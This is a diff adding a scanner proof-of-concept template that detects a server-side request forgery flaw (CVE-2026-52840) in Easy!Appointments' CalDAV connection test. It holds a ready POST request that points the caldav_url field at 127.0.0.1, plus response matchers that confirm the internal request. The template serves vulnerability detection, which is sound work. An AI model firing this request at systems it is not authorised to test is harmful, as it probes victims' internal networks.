@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "检测Easy!Appointments后台CalDAV连接测试功能是否存在SSRF漏洞。通过向caldav/connect_to_server接口发送包含内网地址的caldav_url参数，观察响应中是否反射上游HTTP状态码或错误信息，判断是否存在未授权内网请求。"
+id = "POC-AVE-2026-0758"
+name = "Easy!Appointments CalDAV连接测试服务端请求伪造漏洞 PoC"
+severity = "low"
+tags = [
+    "cve-2026-52840",
+    "ssrf",
+    "easyappointments",
+]
+vuln_id = [
+    "CVE-2026-52840",
+    "AVE-2026-0758",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php/caldav/connect_to_server"
+protocol = "http"
+
+[poc.requests.body]
+content = "csrf_token={{csrf_token}}&provider_id=1&caldav_url=http://127.0.0.1/&caldav_username=x&caldav_password=x"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Client error:",
+    "cURL error",
+    "REPORT http://127.0.0.1",
+]
